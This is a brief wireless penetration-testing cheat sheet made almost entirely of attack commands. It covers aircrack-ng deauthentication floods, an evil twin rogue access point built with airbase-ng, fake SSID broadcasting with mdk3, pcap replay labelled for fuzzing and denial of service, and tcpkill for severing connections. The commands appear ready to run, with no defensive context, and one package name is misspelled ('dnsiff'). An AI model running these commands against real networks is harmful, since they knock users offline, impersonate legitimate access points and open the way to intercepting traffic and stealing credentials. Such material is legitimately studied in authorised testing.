Wireless Pen-testing cheats
===========================

<pre>
# wireless interface must be in promiscuous mode
$ iwconfig #shows all network devices and their modes
</pre>


<h4>Packet Captures</h4>
<pre>
$ ifconfig wlan0 up #brings up wireless card
$ airmon-ng start wlan0 #creates interface on top of the card
$ ifconfig #ensure interface mon0 has been created
$ wireshark & 

click capture interfaces
click start on mon0
</pre>


<h4>Deauthentication Packets:</h4>
<pre>
aireplay-ng --deauth 0 -a <ap-mac-address> -c <client-mac-address> mon0 
#mac address of SSID is found in frame control as destination
</pre>

<h4>Evil Twin attack:</h4>
<pre>
$ airmon-ng start wlan0
$ airodump-ng mon0 #find the AP
$ airbase-ng -a AA:AA:AA:AA:AA:AA -e public -c 11 mon0 #at0 is created as faux interface
$ ifconfig at0 up 
$ aireplay-ng --deauth 0 -a <ap-mac-address>  mon0
</pre>


<h4>MDK (murderdeathkill)</h4>
<pre>
$ mdk3 mon0 b -n pwnsauce     #creates SSID 'pwnsauce' on mon0 broadcast on all channels
</pre>


<h4>Packet Manipulation</h4>
<pre>
$ tcpdump -i eth0 -XX -w dump.pcap   #capture packets in ascii and hex 
$ tcpdump -nvvX -s0 -i  eth0 tcp portrange 22-23   #capture tcp traffic on ports 22/23
$ dumpcap -I eth0 -a duration:30 -w file dump.pcap   #capture packets for 30 and dump to file
$ file2cable -i eth0 -f dump.pcap   #replay pcap from file
$ tcpreplay --topspeed --loop=0 --intf=eth0 dump.pcap --mbps=10|100|1000   #fuzz, dos from file
</pre>


#### tcpkill

	$ apt-get install dnsiff
	$ tcpkill -i eth0 port 21     # kill outgoing ftp connection
	$ tcpkill host [IP_ADDRESS]   # kill packets arriving from or leaving ip address


